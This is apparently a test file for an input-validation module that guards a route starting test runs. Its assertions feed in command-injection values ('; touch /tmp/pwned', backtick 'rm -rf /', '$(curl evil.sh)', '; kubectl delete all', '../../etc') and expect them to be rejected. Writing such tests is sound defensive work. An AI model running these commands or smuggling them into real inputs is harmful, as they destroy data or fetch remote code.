import assert from "node:assert";
import {
  boundedInt,
  validDatabase,
  validLimit,
  validRepoUrl,
  validTestTypes,
} from "../src/lib/engine/input-validation";

console.log("input-validation: trust boundary for start route...");

// repoUrl: injection payloads rejected
assert.strictEqual(validRepoUrl("postgres; touch /tmp/pwned"), null);
assert.strictEqual(validRepoUrl("https://github.com/x/demo.git`rm -rf /`"), null);
assert.strictEqual(validRepoUrl("$(curl evil.sh)"), null);


// repoUrl: accepted shapes
assert.strictEqual(validRepoUrl("https://github.com/chatnarongt/nestjs-platform-express-node.git"),
  "https://github.com/chatnarongt/nestjs-platform-express-node.git");
assert.strictEqual(validRepoUrl("git@github.com:chatnarongt/demo.git"), "git@github.com:chatnarongt/demo.git");
assert.strictEqual(validRepoUrl("/tmp/opencode/repos/demo"), "/tmp/opencode/repos/demo");
assert.strictEqual(validRepoUrl(undefined), "https://github.com/chatnarongt/nestjs-platform-express-node.git");

// test types: only known vocabulary, deduped, non-empty
assert.deepStrictEqual(validTestTypes(["plaintext", "plaintext"]), ["plaintext"]);
assert.deepStrictEqual(validTestTypes(["read-one", "bogus", "delete-many"]), ["read-one", "delete-many"]);
assert.strictEqual(validTestTypes([]), null);
assert.strictEqual(validTestTypes("plaintext"), null);
assert.strictEqual(validTestTypes(["rm -rf /"]), null);

// database: only known engines
assert.strictEqual(validDatabase("postgres"), "postgres");
assert.strictEqual(validDatabase("mongodb"), "mongodb");
assert.strictEqual(validDatabase("postgres; touch /tmp/pwned"), "postgres");

// numeric bounds: absurd or poisoned values fall back to defaults
assert.strictEqual(boundedInt("100; rm", 1, 1000, 100), 100);
assert.strictEqual(boundedInt(-5, 1, 1000, 100), 100);
assert.strictEqual(boundedInt(1e12, 1, 1000, 100), 100);
assert.strictEqual(boundedInt(250, 1, 1000, 100), 250);
assert.strictEqual(boundedInt(undefined, 1, 1000, 100), 100);

// resource limits: k8s quantity-ish grammar only
assert.strictEqual(validLimit("512Mi", "1"), "512Mi");
assert.strictEqual(validLimit("4", "1"), "4");
assert.strictEqual(validLimit("1; kubectl delete all", "1"), "1");
assert.strictEqual(validLimit("../../etc", "8Gi"), "8Gi");

console.log("input-validation tests passed.");
